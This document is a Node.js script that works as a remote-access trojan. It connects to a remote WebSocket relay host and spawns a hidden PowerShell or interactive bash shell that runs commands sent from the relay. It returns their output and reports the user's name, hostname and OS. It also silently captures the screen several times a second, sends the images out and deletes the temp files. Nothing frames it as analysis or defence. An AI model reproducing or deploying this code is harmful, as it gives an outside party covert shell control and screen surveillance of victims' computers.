const WebSocket = require("ws");
const { spawn, execFile } = require("child_process");
const os = require("os");
const fs = require("fs");
const path = require("path");

const RELAY_URL = process.env.RELAY_URL || "wss://sync-node-5024.onrender.com";
const HOST_ID = (os.hostname() + "_" + os.platform()).slice(0, 15).replace(/[^a-zA-Z0-9_-]/g, "");

function loop() {
    const ws = new WebSocket(RELAY_URL + "?role=host&id=" + HOST_ID);
    let shell = null;
    let timer = null;
    let busy = false;

    ws.on("open", () => {
        const isWin = os.platform() === "win32";
        shell = spawn(isWin ? "powershell.exe" : "/bin/bash", isWin ? ["-NoLogo", "-NoProfile"] : ["-i"], {
            windowsHide: true,
            stdio: ["pipe", "pipe", "pipe"]
        });

        const flush = (d) => {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: "term_out", output: d.toString() }));
            }
        };
        shell.stdout.on("data", flush);
        shell.stderr.on("data", flush);

        ws.send(JSON.stringify({
            type: "term_out",
            output: "[CONNECTED] " + os.userInfo().username + "@" + os.hostname() + " (" + os.platform() + " " + os.release() + ")
"
        }));

        timer = setInterval(() => {
            if (ws.readyState !== WebSocket.OPEN || busy) return;
            busy = true;
            grabScreen((err, buf) => {
                busy = false;
                if (err || !buf || ws.readyState !== WebSocket.OPEN) return;
                const hdr = Buffer.alloc(16, 0);
                hdr.write(HOST_ID, 0, "utf8");
                ws.send(Buffer.concat([hdr, buf]), { binary: true });
            });
        }, 220);
    });

    ws.on("message", (raw) => {
        try {
            const msg = JSON.parse(raw);
            if (msg.type === "cmd" && shell && shell.stdin.writable) {
                shell.stdin.write(msg.command + "
");
            }
        } catch (e) {}
    });

    const reset = () => {
        if (timer) clearInterval(timer);
        if (shell) { try { shell.kill(); } catch (e) {} }
        setTimeout(loop, 2500);
    };
    ws.on("close", reset);
    ws.on("error", () => {});
}

function grabScreen(cb) {
    const tmp = path.join(os.tmpdir(), ".f_" + process.pid + ".jpg");
    if (os.platform() === "win32") {
        const ps = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); $bmp.Save('" + tmp + "', [System.Drawing.Imaging.ImageFormat]::Jpeg); $g.Dispose(); $bmp.Dispose()";
        execFile("powershell.exe", ["-NoProfile", "-WindowStyle", "Hidden", "-Command", ps], { windowsHide: true }, (e) => {
            if (e) return cb(e);
            fs.readFile(tmp, (re, d) => { fs.unlink(tmp, () => {}); cb(re, d); });
        });
    } else {
        const shCmd = "if command -v spectacle >/dev/null 2>&1; then spectacle -b -n -f -o " + tmp + " 2>/dev/null; elif command -v grim >/dev/null 2>&1; then grim -t jpeg -q 50 " + tmp + " 2>/dev/null; elif command -v scrot >/dev/null 2>&1; then scrot -o -q 50 " + tmp + " 2>/dev/null; fi";
        execFile("/bin/sh", ["-c", shCmd], (e) => {
            if (e) return cb(e);
            fs.readFile(tmp, (re, d) => { fs.unlink(tmp, () => {}); cb(re, d); });
        });
    }
}

loop();
